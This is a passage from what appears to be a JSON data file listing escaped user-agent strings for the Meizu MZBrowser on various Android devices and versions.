Chrome\/57.0.2987.108 MZBrowser\/7.14.110-2020010216 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.511-2018011519 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.110-2018082915 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.410-2017122215 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.7.3 UWS\/2.11.0.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m3 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.310-2017121220 UWS\/2.11.0.32 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.710-2018040314 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m3 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.210-2017112119 UWS\/2.11.0.32 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.7.2 UWS\/2.11.0.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.110-2018082915 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX4 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.511-2018012510 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 7 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.11.110-2018061318 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.7.3 UWS\/2.11.0.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.12.110-2019110416 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-meizu M8 lite Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.121-2018080915 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.110-2017110719 UWS\/2.10.1.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.3.6 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.5.110-2018110721 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-M2 E Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.10.2 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-PRO 6 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.7.110-2019010410 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m1 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.7.3 UWS\/2.11.0.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3_s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m2 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.310-2017121220 UWS\/2.11.0.32 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.10.110-2018052111 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-Meizu M8c Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu note8 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.5.1 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.4.1 UWS\/2.11.0.34 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.2.0 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.11.110-2018061318 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-Meizu M6s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.410-2017122215 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX4 Pro Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.110-2018072414 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.15.110-2020030418 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 X Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.16.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-15 Lite Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-Meizu M6s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.7.3 UWS\/2.11.0.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-16s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.17.0 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m1 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.710-2018040314 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.9.110-2019060317 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.6.110-2018121017 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7-S Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.4.1 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m3 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.6.101 UWS\/2.10.1.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.210-2017112119 UWS\/2.11.0.32 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.8.5 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.9.4 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m2 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.10.110-2018052111 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 7 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.0.120-2018051609 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-m3 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.7.3 UWS\/2.11.0.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.9.6 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.7.110-2019010410 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.110-2017110719 UWS\/2.10.1.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.7.3 UWS\/2.11.0.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.3.2 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.10.2 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.8.110-2019031217 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-15 Lite Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M2 E Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.6.101 UWS\/2.10.1.22 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M A5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.7.110-2019010410 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M1E Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.110-2018072414 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-16s Pro Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.16.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.16.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-Meizu M8c Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.120-2019041909 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/73.0.3683.121 MZBrowser\/8.18.0 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu 16Xs Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.16.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m1 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu M10 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.99.141-2019092717 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/73.0.3683.121 MZBrowser\/8.18.1 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu 16Xs Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/73.0.3683.121 MZBrowser\/8.18.1 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-SM-G925F Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/73.0.3683.121 MZBrowser\/8.18.1 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.5.110-2021020110 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.5.110-2021020110 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.5.110-2021020110 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.5.110-2021020110 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.5.110-2021020110 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.5.110-2021020110 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build\/MRA58K) 